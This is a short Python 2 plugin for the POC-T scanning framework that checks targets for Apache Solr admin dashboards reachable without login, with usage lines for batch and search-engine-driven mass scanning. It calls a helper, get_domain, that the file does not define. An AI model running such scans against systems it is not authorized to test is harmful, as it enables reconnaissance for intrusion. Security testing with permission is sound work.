#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Apache Solr 未授权访问PoC
  (iterate_path函数使用场景示例)

Usage
  python POC-T.py -s solr-unauth -iF target.txt
  python POC-T.py -s solr-unauth -aZ "solr country:cn"

"""

import requests
import urlparse



def poc(target):
    base_url = target if "://" in target else 'http://' + target
    for each in iterate_path(base_url):
        try:
            url = each
            g = requests.get(url, headers={'User-Agent': firefox()})
            if g.status_code is 200 and 'Solr Admin' in g.content and 'Dashboard' in g.content:
                return [True,'solr']
            url = url + '/solr/'
            g = requests.get(url, headers={'User-Agent': firefox()})
            if g.status_code is 200 and 'Solr Admin' in g.content and 'Dashboard' in g.content:
                return [True,'solr']
        except Exception:
            pass
    return False

def firefox():
    return 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0'

def iterate_path(ori_str):
    """
    added by cdxy May 8 Sun,2016

    Use:
    iterate_path_to_list('http://cdxy.me:80/cdsa/cda/aaa.jsp?id=2#')

    Return:
    ['http://cdxy.me:80/cdsa/cda/aaa.jsp?id=2#',
     'http://cdxy.me:80/'
     'http://cdxy.me:80/cdsa',
     'http://cdxy.me:80/cdsa/cda',
     'http://cdxy.me:80/cdsa/cda/aaa.jsp']

    """
    parser = urlparse.urlparse(ori_str)
    _path_list = parser.path.replace('//', '/').strip('/').split('/')
    _ans_list = set()
    _ans_list.add(ori_str)

    if not _path_list[0]:
        return _ans_list

    _ans_list.add(get_domain(ori_str))
    s = ''
    for each in _path_list:
        s += '/' + each
        _ans_list.add(urlparse.urljoin(ori_str, s))
    return _ans_list